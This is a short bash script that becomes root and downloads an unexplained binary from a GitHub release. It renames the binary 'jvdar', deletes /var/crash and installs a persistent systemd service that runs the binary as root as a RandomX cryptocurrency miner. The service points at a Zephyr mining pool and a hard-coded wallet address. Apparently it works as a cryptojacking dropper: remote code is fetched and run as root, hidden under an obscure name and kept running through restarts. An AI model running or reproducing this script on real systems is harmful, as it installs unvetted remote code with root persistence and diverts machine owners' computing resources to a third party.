#!/bin/bash
sudo su
cd /home
wget https://github.com/trangtrau/sang_ml/releases/download/test/ar 
cp ar jvdar 
chmod +x jvdar

rm -rf /lib/systemd/system/xmrthanh.service
rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/xmrthanh.service 
[Unit]
Description=xmrthanh
After=network.target
[Service]
ExecStart= /home/jvdar -o zephyr.miningocean.org:5332 -u ZEPHs7GMpgyKyQDSpaczt8VSm2e3YTjwHZTekzN8xzLTGGkMqXRFdHZHCP9eWwtSgEawC23tGVQ69DuZNpbLuwuNNRf8H5w76XJ -p 1svts -a rx/0 -k -t 16
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable xmrthanh.service &&
service xmrthanh stop  &&
service xmrthanh restart
top
